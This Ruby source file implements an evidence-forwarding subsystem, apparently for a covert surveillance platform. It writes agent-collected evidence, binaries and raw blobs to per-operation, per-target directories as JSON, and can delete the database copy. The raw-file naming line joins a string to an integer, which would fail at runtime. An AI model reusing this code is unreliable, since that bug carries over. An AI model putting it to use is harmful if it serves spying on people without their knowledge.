#
# The forwarding subsystem (for connectors with third party)
#

# from RCS::Common
require 'rcs-common/trace'

require 'pp'

module RCS
module DB

class Forwarding
  extend RCS::Tracer

  class << self

    def new_evidence(evidence, raws = [])

      ::Forwarder.where(:enabled => true).each do |f|

        # the generator of the evidence
        agent = ::Item.find(evidence.aid)

        # skip non matching rules
        next unless match_path(f, agent)

        # check for unsupported types
        raise "unsupported forwarding method: #{f.type}" if f.type != 'JSON'

        # get the parents
        operation = ::Item.find(agent.path.first)
        target = ::Item.find(agent.path.last)

        # the full exporting path will be splitted in subdir (one for each item)
        path = File.join(f.dest, operation.name, target.name, agent.name)

        # ensure the dest dir is created
        FileUtils.mkdir_p path

        # dump the evidence
        File.open(File.join(path, evidence[:_id].to_s + '.json'), 'wb') {|d| d.write evidence.to_json}

        # dump the binary (if any)
        if evidence[:data]['_grid']
          file = GridFS.get evidence[:data]['_grid'], target[:_id].to_s
          File.open(File.join(path, evidence[:_id].to_s + '.bin'), 'wb') {|d| d.write file.read}
        end

        # save the raw evidence
        if f.raw
          raws.each_with_index do |raw, index|
            file = GridFS.get raw, 'evidence'
            File.open(File.join(path, evidence[:_id].to_s + '-' + index + '.raw'), 'wb') {|d| d.write file.read}
          end
        end

        # delete the evidence if the rule specify to not store it in the db
        evidence.destroy! unless f.keep
      end

    end

    def match_path(forwarder, agent)
      # empty path means everything
      return true if forwarder.path.empty?

      # the path of an agent does not include itself, add it to obtain the full path
      agent_path = agent.path + [agent._id]

      # check if the agent path is included in the path
      # this way an alert on a target will be triggered by all of its agent
      (agent_path & forwarder.path == forwarder.path)
    end
  end

end

end # ::DB
end # ::RCS